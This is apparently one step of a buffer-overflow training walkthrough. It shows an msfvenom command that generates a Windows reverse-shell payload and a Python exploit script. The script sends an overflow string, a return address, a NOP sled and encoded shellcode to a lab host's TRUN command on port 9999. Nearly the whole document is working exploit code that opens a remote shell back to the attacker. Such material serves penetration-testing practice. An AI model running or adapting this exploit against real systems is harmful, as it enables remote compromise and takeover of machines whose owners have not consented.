7-Generating Shellcode and Gaining Access

~~~bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT EXITFUNC=thread -f c -a x86 -b "\x00\OTHERBADCHARS"
~~~

~~~python
#!/usr/bin/python
import sys, socket

#\x90 = NOP

eipown = "A" * 2003 + "\xaf\x11\x50\x62"
nop = "\x90" *  32
shellcode = ("\xbb\x2e\x9a\x40\x2a\xd9\xed\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x5e\x12\x83\xc6\x04\x03\x70\x94\xa2\xdf\x70\x40\xa0"
"\x20\x88\x91\xc5\xa9\x6d\xa0\xc5\xce\xe6\x93\xf5\x85\xaa\x1f"
"\x7d\xcb\x5e\xab\xf3\xc4\x51\x1c\xb9\x32\x5c\x9d\x92\x07\xff"
"\x1d\xe9\x5b\xdf\x1c\x22\xae\x1e\x58\x5f\x43\x72\x31\x2b\xf6"
"\x62\x36\x61\xcb\x09\x04\x67\x4b\xee\xdd\x86\x7a\xa1\x56\xd1"
"\x5c\x40\xba\x69\xd5\x5a\xdf\x54\xaf\xd1\x2b\x22\x2e\x33\x62"
"\xcb\x9d\x7a\x4a\x3e\xdf\xbb\x6d\xa1\xaa\xb5\x8d\x5c\xad\x02"
"\xef\xba\x38\x90\x57\x48\x9a\x7c\x69\x9d\x7d\xf7\x65\x6a\x09"
"\x5f\x6a\x6d\xde\xd4\x96\xe6\xe1\x3a\x1f\xbc\xc5\x9e\x7b\x66"
"\x67\x87\x21\xc9\x98\xd7\x89\xb6\x3c\x9c\x24\xa2\x4c\xff\x20"
"\x07\x7d\xff\xb0\x0f\xf6\x8c\x82\x90\xac\x1a\xaf\x59\x6b\xdd"
"\xd0\x73\xcb\x71\x2f\x7c\x2c\x58\xf4\x28\x7c\xf2\xdd\x50\x17"
"\x02\xe1\x84\xb8\x52\x4d\x77\x79\x02\x2d\x27\x11\x48\xa2\x18"
"\x01\x73\x68\x31\xa8\x8e\xfb\xfe\x85\x6d\x7b\x96\xd7\x8d\x6d"
"\x3b\x51\x6b\xe7\xd3\x37\x24\x90\x4a\x12\xbe\x01\x92\x88\xbb"
"\x02\x18\x3f\x3c\xcc\xe9\x4a\x2e\xb9\x19\x01\x0c\x6c\x25\xbf"
"\x38\xf2\xb4\x24\xb8\x7d\xa5\xf2\xef\x2a\x1b\x0b\x65\xc7\x02"
"\xa5\x9b\x1a\xd2\x8e\x1f\xc1\x27\x10\x9e\x84\x1c\x36\xb0\x50"
"\x9c\x72\xe4\x0c\xcb\x2c\x52\xeb\xa5\x9e\x0c\xa5\x1a\x49\xd8"
"\x30\x51\x4a\x9e\x3c\xbc\x3c\x7e\x8c\x69\x79\x81\x21\xfe\x8d"
"\xfa\x5f\x9e\x72\xd1\xdb\xbe\x90\xf3\x11\x57\x0d\x96\x9b\x3a"
"\xae\x4d\xdf\x42\x2d\x67\xa0\xb0\x2d\x02\xa5\xfd\xe9\xff\xd7"
"\x6e\x9c\xff\x44\x8e\xb5")

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.253.129",9999))
	s.send(('TRUN /.:/' + eipown + nop + shellcode))
	s.close()

except:
	print "Error Connecting to Server..."
	sys.exit()

~~~

